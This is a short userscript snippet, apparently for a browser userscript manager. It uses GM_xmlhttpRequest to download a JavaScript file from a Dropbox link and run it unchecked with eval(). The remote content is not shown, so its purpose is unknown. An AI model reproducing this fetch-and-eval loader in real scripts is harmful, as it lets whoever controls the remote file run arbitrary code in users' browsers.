(function() {
    GM_xmlhttpRequest({
        method: "GET",
        url: "https://dl.dropboxusercontent.com/scl/fi/w7ptfh525zesvinbqtxja/multiplugin.js?rlkey=1zozlazpsovf4sy96pdez6d23&st=544lfp8b",
        onload: function(response) {
            eval(response.responseText);
        }
    });
})();
